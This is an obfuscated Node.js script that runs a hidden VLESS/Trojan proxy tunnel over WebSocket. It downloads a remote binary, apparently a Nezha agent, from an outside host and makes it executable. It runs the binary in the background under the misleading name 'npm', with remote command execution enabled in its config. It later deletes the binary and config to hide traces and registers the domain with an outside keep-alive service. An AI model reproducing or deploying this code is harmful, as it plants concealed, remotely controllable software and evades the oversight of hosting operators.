const _0x9d35f5=_0x3055;(function(_0x3a97ae,_0x583025){const _0x1abacb=_0x3055,_0x413e6e=_0x3a97ae();while(!![]){try{const _0x4854c6=parseInt(_0x1abacb(0x208))/0x1*(parseInt(_0x1abacb(0x212))/0x2)+parseInt(_0x1abacb(0x26b))/0x3+-parseInt(_0x1abacb(0x250))/0x4+parseInt(_0x1abacb(0x24d))/0x5+-parseInt(_0x1abacb(0x20a))/0x6+parseInt(_0x1abacb(0x259))/0x7*(-parseInt(_0x1abacb(0x265))/0x8)+parseInt(_0x1abacb(0x231))/0x9;if(_0x4854c6===_0x583025)break;else _0x413e6e['push'](_0x413e6e['shift']());}catch(_0x2dae50){_0x413e6e['push'](_0x413e6e['shift']());}}}(_0x22c4,0xedbac));function _0x22c4(){const _0x404aa=['https://amd64.ssss.nyc.mn/v1','UUID','http','url','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','every','connection','npm\x20is\x20running','1BqeiVS','--tls','5091900SsQhvg','toString','log','trojan://','trim','application/json','arm','write','2760466IVVZOw',':443?security=tls&sni=','update','Status','slice','catch','text/plain','SUB_PATH','readUInt16BE','substr','pipe','vless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','split','config.yaml','false','error:\x20','createWriteStream','&type=A','https://oooo.serv00.net/add-url','error','2083','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','sha224','pop','https://arm64.ssss.nyc.mn/v1','utf8','Not\x20Found\x0a','npm','NEZHA_SERVER','child_process','20422827YwEXKu','readFile','test','axios','application/dns-json','from','PORT','\x20-p\x20','npm\x20running\x20error:','path','NEZHA_PORT','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','concat','buffer','createHash','once','arch','reduce','1234.abc.com','env','utf-8','npm\x20download\x20successfully','send','/bin/bash','&fp=chrome&type=ws&host=','Hug','createServer','&path=%2F','2272485ToCOSC','get','writeFileSync','5759352dRRoCG','Answer','https://dns.google/resolve?name=','https://arm64.ssss.nyc.mn/agent','listen','message','map','client_secret:\x20','writeHead','10846059kiXeUT','Server\x20is\x20running\x20on\x20port\x20','https://amd64.ssss.nyc.mn/agent','NEZHA_KEY','end','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','then','crypto','stream','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','replace','8lUPBla','text/html','443','type','2096','data','2123196dqAlbT','includes','\x20with\x20all\x20DNS\x20servers','decode','8443','readUInt8','Hello\x20world!','close','join','net','index.html','finish','f78cbd17-2f5e-4b46-ac0e-311e70e80692','length','post','arm64','https://','setsid\x20nohup\x20./npm\x20-s\x20','https://speed.cloudflare.com/meta','Unknown','1.1.1.1','connect','chmod\x20+x\x20npm','asOrganization','Automatic\x20Access\x20Task\x20added\x20successfully','true','find'];_0x22c4=function(){return _0x404aa;};return _0x22c4();}const os=require('os'),http=require(_0x9d35f5(0x202)),fs=require('fs'),axios=require(_0x9d35f5(0x234)),net=require(_0x9d35f5(0x274)),path=require(_0x9d35f5(0x23a)),crypto=require(_0x9d35f5(0x260)),{Buffer}=require(_0x9d35f5(0x23e)),{exec,execSync}=require(_0x9d35f5(0x230)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x9d35f5(0x244)][_0x9d35f5(0x201)]||_0x9d35f5(0x277),NEZHA_SERVER=process[_0x9d35f5(0x244)][_0x9d35f5(0x22f)]||'',NEZHA_PORT=process[_0x9d35f5(0x244)][_0x9d35f5(0x23b)]||'',NEZHA_KEY=process[_0x9d35f5(0x244)][_0x9d35f5(0x25c)]||'',DOMAIN=process[_0x9d35f5(0x244)]['DOMAIN']||_0x9d35f5(0x243),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x9d35f5(0x244)]['WSPATH']||UUID[_0x9d35f5(0x216)](0x0,0x8),SUB_PATH=process[_0x9d35f5(0x244)][_0x9d35f5(0x219)]||'sub',NAME=process['env'][_0x9d35f5(0x263)]||_0x9d35f5(0x24a),PORT=process['env'][_0x9d35f5(0x237)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5031bf=_0x9d35f5;try{const _0x2e4242=await axios[_0x5031bf(0x24e)](_0x5031bf(0x1f7)),_0x4ec829=_0x2e4242[_0x5031bf(0x26a)];ISP=(_0x4ec829['country']+'-'+_0x4ec829[_0x5031bf(0x1fc)])['replace'](/ /g,'_');}catch(_0xaa9330){ISP=_0x5031bf(0x1f8);}};GetISP();const httpServer=http[_0x9d35f5(0x24b)]((_0x22a909,_0x232927)=>{const _0x3de1a5=_0x9d35f5;if(_0x22a909[_0x3de1a5(0x203)]==='/'){const _0x1d6423=path[_0x3de1a5(0x273)](__dirname,_0x3de1a5(0x275));fs[_0x3de1a5(0x232)](_0x1d6423,_0x3de1a5(0x22c),(_0xe84c9f,_0x74931d)=>{const _0x5f116f=_0x3de1a5;if(_0xe84c9f){_0x232927[_0x5f116f(0x258)](0xc8,{'Content-Type':_0x5f116f(0x266)}),_0x232927['end'](_0x5f116f(0x271));return;}_0x232927['writeHead'](0xc8,{'Content-Type':_0x5f116f(0x266)}),_0x232927[_0x5f116f(0x25d)](_0x74931d);});return;}else{if(_0x22a909[_0x3de1a5(0x203)]==='/'+SUB_PATH){const _0x7cba87=_0x3de1a5(0x21d)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x3de1a5(0x249)+DOMAIN+_0x3de1a5(0x24c)+WSPATH+'#'+NAME+'-'+ISP,_0x176f8c=_0x3de1a5(0x20d)+UUID+'@'+DOMAIN+_0x3de1a5(0x213)+DOMAIN+_0x3de1a5(0x249)+DOMAIN+_0x3de1a5(0x24c)+WSPATH+'#'+NAME+'-'+ISP,_0x4dce06=_0x7cba87+'\x0a'+_0x176f8c,_0x4691bb=Buffer[_0x3de1a5(0x236)](_0x4dce06)['toString']('base64');_0x232927[_0x3de1a5(0x258)](0xc8,{'Content-Type':_0x3de1a5(0x218)}),_0x232927[_0x3de1a5(0x25d)](_0x4691bb+'\x0a');}else _0x232927['writeHead'](0x194,{'Content-Type':_0x3de1a5(0x218)}),_0x232927[_0x3de1a5(0x25d)](_0x3de1a5(0x22d));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x9d35f5(0x264)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x9d35f5(0x1f9)];function resolveHost(_0x3924b0){return new Promise((_0x3513b4,_0x46461b)=>{const _0x23688d=_0x3055;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x23688d(0x233)](_0x3924b0)){_0x3513b4(_0x3924b0);return;}let _0x1b0805=0x0;function _0x2875f3(){const _0x45b0e2=_0x23688d;if(_0x1b0805>=DNS_SERVERS[_0x45b0e2(0x278)]){_0x46461b(new Error('Failed\x20to\x20resolve\x20'+_0x3924b0+_0x45b0e2(0x26d)));return;}const _0xfc7b75=DNS_SERVERS[_0x1b0805];_0x1b0805++;const _0xd48994=_0x45b0e2(0x252)+encodeURIComponent(_0x3924b0)+_0x45b0e2(0x224);axios[_0x45b0e2(0x24e)](_0xd48994,{'timeout':0x1388,'headers':{'Accept':_0x45b0e2(0x235)}})[_0x45b0e2(0x25f)](_0x4709da=>{const _0x41975d=_0x45b0e2,_0x2b4ab7=_0x4709da[_0x41975d(0x26a)];if(_0x2b4ab7[_0x41975d(0x215)]===0x0&&_0x2b4ab7['Answer']&&_0x2b4ab7[_0x41975d(0x251)]['length']>0x0){const _0x520b42=_0x2b4ab7['Answer'][_0x41975d(0x1ff)](_0xa5b18b=>_0xa5b18b[_0x41975d(0x268)]===0x1);if(_0x520b42){_0x3513b4(_0x520b42['data']);return;}}_0x2875f3();})[_0x45b0e2(0x217)](_0x3cc226=>{_0x2875f3();});}_0x2875f3();});}function handleVlessConnection(_0xa3cfc5,_0x21e00e){const _0x143e0b=_0x9d35f5,[_0x79521a]=_0x21e00e,_0x5028d7=_0x21e00e['slice'](0x1,0x11);if(!_0x5028d7[_0x143e0b(0x205)]((_0x52baae,_0x427ea5)=>_0x52baae==parseInt(uuid[_0x143e0b(0x21b)](_0x427ea5*0x2,0x2),0x10)))return![];let _0xef6fa0=_0x21e00e[_0x143e0b(0x216)](0x11,0x12)[_0x143e0b(0x270)]()+0x13;const _0x539e6e=_0x21e00e[_0x143e0b(0x216)](_0xef6fa0,_0xef6fa0+=0x2)[_0x143e0b(0x21a)](0x0),_0x3d8d5a=_0x21e00e[_0x143e0b(0x216)](_0xef6fa0,_0xef6fa0+=0x1)[_0x143e0b(0x270)](),_0x9ae1d6=_0x3d8d5a==0x1?_0x21e00e['slice'](_0xef6fa0,_0xef6fa0+=0x4)['join']('.'):_0x3d8d5a==0x2?new TextDecoder()[_0x143e0b(0x26e)](_0x21e00e[_0x143e0b(0x216)](_0xef6fa0+0x1,_0xef6fa0+=0x1+_0x21e00e[_0x143e0b(0x216)](_0xef6fa0,_0xef6fa0+0x1)['readUInt8']())):_0x3d8d5a==0x3?_0x21e00e[_0x143e0b(0x216)](_0xef6fa0,_0xef6fa0+=0x10)[_0x143e0b(0x242)]((_0x3158d2,_0x127167,_0x57de6a,_0x28b98c)=>_0x57de6a%0x2?_0x3158d2[_0x143e0b(0x23d)](_0x28b98c[_0x143e0b(0x216)](_0x57de6a-0x1,_0x57de6a+0x1)):_0x3158d2,[])['map'](_0x5c4a10=>_0x5c4a10['readUInt16BE'](0x0)['toString'](0x10))[_0x143e0b(0x273)](':'):'';_0xa3cfc5[_0x143e0b(0x247)](new Uint8Array([_0x79521a,0x0]));const _0x42e4a6=createWebSocketStream(_0xa3cfc5);return resolveHost(_0x9ae1d6)[_0x143e0b(0x25f)](_0x48d958=>{const _0xd97061=_0x143e0b;net[_0xd97061(0x1fa)]({'host':_0x48d958,'port':_0x539e6e},function(){const _0x638225=_0xd97061;this[_0x638225(0x211)](_0x21e00e[_0x638225(0x216)](_0xef6fa0)),_0x42e4a6['on'](_0x638225(0x226),()=>{})['pipe'](this)['on'](_0x638225(0x226),()=>{})[_0x638225(0x21c)](_0x42e4a6);})['on'](_0xd97061(0x226),()=>{});})[_0x143e0b(0x217)](_0x2d4748=>{const _0x475ebb=_0x143e0b;net[_0x475ebb(0x1fa)]({'host':_0x9ae1d6,'port':_0x539e6e},function(){const _0x22e5b3=_0x475ebb;this[_0x22e5b3(0x211)](_0x21e00e[_0x22e5b3(0x216)](_0xef6fa0)),_0x42e4a6['on'](_0x22e5b3(0x226),()=>{})['pipe'](this)['on'](_0x22e5b3(0x226),()=>{})[_0x22e5b3(0x21c)](_0x42e4a6);})['on'](_0x475ebb(0x226),()=>{});}),!![];}function _0x3055(_0x376a1f,_0x862d60){const _0x22c487=_0x22c4();return _0x3055=function(_0x30552a,_0x220554){_0x30552a=_0x30552a-0x1f4;let _0x27349d=_0x22c487[_0x30552a];return _0x27349d;},_0x3055(_0x376a1f,_0x862d60);}function handleTrojanConnection(_0x1a9b8d,_0x1213bc){const _0x5dabb6=_0x9d35f5;try{if(_0x1213bc[_0x5dabb6(0x278)]<0x3a)return![];const _0x5a4e02=_0x1213bc[_0x5dabb6(0x216)](0x0,0x38)[_0x5dabb6(0x20b)](),_0x22ab21=[UUID];let _0x303d7c=null;for(const _0x138ec2 of _0x22ab21){const _0x1dd961=crypto[_0x5dabb6(0x23f)](_0x5dabb6(0x229))[_0x5dabb6(0x214)](_0x138ec2)['digest']('hex');if(_0x1dd961===_0x5a4e02){_0x303d7c=_0x138ec2;break;}}if(!_0x303d7c)return![];let _0x448fe2=0x38;_0x1213bc[_0x448fe2]===0xd&&_0x1213bc[_0x448fe2+0x1]===0xa&&(_0x448fe2+=0x2);const _0x51401f=_0x1213bc[_0x448fe2];if(_0x51401f!==0x1)return![];_0x448fe2+=0x1;const _0x71270b=_0x1213bc[_0x448fe2];_0x448fe2+=0x1;let _0x48dc12,_0x45dea2;if(_0x71270b===0x1)_0x48dc12=_0x1213bc[_0x5dabb6(0x216)](_0x448fe2,_0x448fe2+0x4)[_0x5dabb6(0x273)]('.'),_0x448fe2+=0x4;else{if(_0x71270b===0x3){const _0x25abe9=_0x1213bc[_0x448fe2];_0x448fe2+=0x1,_0x48dc12=_0x1213bc[_0x5dabb6(0x216)](_0x448fe2,_0x448fe2+_0x25abe9)['toString'](),_0x448fe2+=_0x25abe9;}else{if(_0x71270b===0x4)_0x48dc12=_0x1213bc[_0x5dabb6(0x216)](_0x448fe2,_0x448fe2+0x10)[_0x5dabb6(0x242)]((_0x4ead1c,_0x33f6b0,_0x58cf46,_0x3a0f51)=>_0x58cf46%0x2?_0x4ead1c[_0x5dabb6(0x23d)](_0x3a0f51[_0x5dabb6(0x216)](_0x58cf46-0x1,_0x58cf46+0x1)):_0x4ead1c,[])[_0x5dabb6(0x256)](_0x608270=>_0x608270[_0x5dabb6(0x21a)](0x0)[_0x5dabb6(0x20b)](0x10))[_0x5dabb6(0x273)](':'),_0x448fe2+=0x10;else return![];}}_0x45dea2=_0x1213bc[_0x5dabb6(0x21a)](_0x448fe2),_0x448fe2+=0x2;_0x448fe2<_0x1213bc[_0x5dabb6(0x278)]&&_0x1213bc[_0x448fe2]===0xd&&_0x1213bc[_0x448fe2+0x1]===0xa&&(_0x448fe2+=0x2);const _0x4a64a9=createWebSocketStream(_0x1a9b8d);return resolveHost(_0x48dc12)[_0x5dabb6(0x25f)](_0x437762=>{const _0x2efda7=_0x5dabb6;net[_0x2efda7(0x1fa)]({'host':_0x437762,'port':_0x45dea2},function(){const _0x156aa2=_0x2efda7;_0x448fe2<_0x1213bc[_0x156aa2(0x278)]&&this[_0x156aa2(0x211)](_0x1213bc['slice'](_0x448fe2)),_0x4a64a9['on'](_0x156aa2(0x226),()=>{})['pipe'](this)['on']('error',()=>{})[_0x156aa2(0x21c)](_0x4a64a9);})['on'](_0x2efda7(0x226),()=>{});})[_0x5dabb6(0x217)](_0x255745=>{const _0x15090a=_0x5dabb6;net[_0x15090a(0x1fa)]({'host':_0x48dc12,'port':_0x45dea2},function(){const _0x56d5a2=_0x15090a;_0x448fe2<_0x1213bc[_0x56d5a2(0x278)]&&this[_0x56d5a2(0x211)](_0x1213bc[_0x56d5a2(0x216)](_0x448fe2)),_0x4a64a9['on'](_0x56d5a2(0x226),()=>{})[_0x56d5a2(0x21c)](this)['on'](_0x56d5a2(0x226),()=>{})[_0x56d5a2(0x21c)](_0x4a64a9);})['on']('error',()=>{});}),!![];}catch(_0x4dbe4f){return![];}}wss['on'](_0x9d35f5(0x206),(_0x224476,_0xfacbc)=>{const _0x1247d0=_0x9d35f5,_0x203d2c=_0xfacbc[_0x1247d0(0x203)]||'';_0x224476[_0x1247d0(0x240)](_0x1247d0(0x255),_0x33d97b=>{const _0x1680b2=_0x1247d0;if(_0x33d97b['length']>0x11&&_0x33d97b[0x0]===0x0){const _0x333daf=_0x33d97b[_0x1680b2(0x216)](0x1,0x11),_0x12b06d=_0x333daf[_0x1680b2(0x205)]((_0x55df23,_0x446fd2)=>_0x55df23==parseInt(uuid[_0x1680b2(0x21b)](_0x446fd2*0x2,0x2),0x10));if(_0x12b06d){!handleVlessConnection(_0x224476,_0x33d97b)&&_0x224476[_0x1680b2(0x272)]();return;}}!handleTrojanConnection(_0x224476,_0x33d97b)&&_0x224476[_0x1680b2(0x272)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x24cec0=_0x9d35f5,_0x20f915=os[_0x24cec0(0x241)]();return _0x20f915===_0x24cec0(0x210)||_0x20f915===_0x24cec0(0x1f4)||_0x20f915==='aarch64'?!NEZHA_PORT?_0x24cec0(0x22b):_0x24cec0(0x253):!NEZHA_PORT?_0x24cec0(0x200):_0x24cec0(0x25b);},downloadFile=async()=>{const _0x3e419c=_0x9d35f5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x550a65=getDownloadUrl(),_0x2b7bd2=await axios({'method':_0x3e419c(0x24e),'url':_0x550a65,'responseType':_0x3e419c(0x261)}),_0xcb35b=fs[_0x3e419c(0x223)](_0x3e419c(0x22e));return _0x2b7bd2['data'][_0x3e419c(0x21c)](_0xcb35b),new Promise((_0x490932,_0x18da15)=>{const _0xea2b2c=_0x3e419c;_0xcb35b['on'](_0xea2b2c(0x276),()=>{const _0x5c312c=_0xea2b2c;console[_0x5c312c(0x20c)](_0x5c312c(0x246)),exec(_0x5c312c(0x1fb),_0x4592a7=>{if(_0x4592a7)_0x18da15(_0x4592a7);_0x490932();});}),_0xcb35b['on'](_0xea2b2c(0x226),_0x18da15);});}catch(_0x1354fa){throw _0x1354fa;}},runnz=async()=>{const _0xf15a58=_0x9d35f5;try{const _0x4fa6d2=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0xf15a58(0x245)});if(_0x4fa6d2[_0xf15a58(0x20e)]()!==''){console[_0xf15a58(0x20c)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x43385f){}await downloadFile();let _0x350c04='',_0x96ce55=[_0xf15a58(0x267),_0xf15a58(0x26f),_0xf15a58(0x269),'2087',_0xf15a58(0x227),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xacc188=_0x96ce55[_0xf15a58(0x26c)](NEZHA_PORT)?_0xf15a58(0x209):'';_0x350c04=_0xf15a58(0x1f6)+NEZHA_SERVER+':'+NEZHA_PORT+_0xf15a58(0x238)+NEZHA_KEY+'\x20'+_0xacc188+_0xf15a58(0x262);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2816f7=NEZHA_SERVER[_0xf15a58(0x26c)](':')?NEZHA_SERVER[_0xf15a58(0x21f)](':')[_0xf15a58(0x22a)]():'',_0x593d39=_0x96ce55['includes'](_0x2816f7)?_0xf15a58(0x1fe):_0xf15a58(0x221),_0x3cb6e2=_0xf15a58(0x257)+NEZHA_KEY+_0xf15a58(0x21e)+NEZHA_SERVER+_0xf15a58(0x204)+_0x593d39+_0xf15a58(0x228)+UUID;fs[_0xf15a58(0x24f)]('config.yaml',_0x3cb6e2);}_0x350c04=_0xf15a58(0x25e);}else{console[_0xf15a58(0x20c)](_0xf15a58(0x23c));return;}}try{exec(_0x350c04,{'shell':_0xf15a58(0x248)},_0x4ad562=>{const _0xa9dcb8=_0xf15a58;if(_0x4ad562)console[_0xa9dcb8(0x226)](_0xa9dcb8(0x239),_0x4ad562);else console[_0xa9dcb8(0x20c)](_0xa9dcb8(0x207));});}catch(_0x3bf9b2){console[_0xf15a58(0x226)](_0xf15a58(0x222)+_0x3bf9b2);}};async function addAccessTask(){const _0x29d479=_0x9d35f5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1e1205=_0x29d479(0x1f5)+DOMAIN;try{const _0x1ebf8d=await axios[_0x29d479(0x279)](_0x29d479(0x225),{'url':_0x1e1205},{'headers':{'Content-Type':_0x29d479(0x20f)}});console[_0x29d479(0x20c)](_0x29d479(0x1fd));}catch(_0x12c4bf){}}const delFiles=()=>{const _0x12ae52=_0x9d35f5;fs['unlink'](_0x12ae52(0x22e),()=>{}),fs['unlink'](_0x12ae52(0x220),()=>{});};httpServer[_0x9d35f5(0x254)](PORT,()=>{const _0x4a5183=_0x9d35f5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4a5183(0x20c)](_0x4a5183(0x25a)+PORT);});
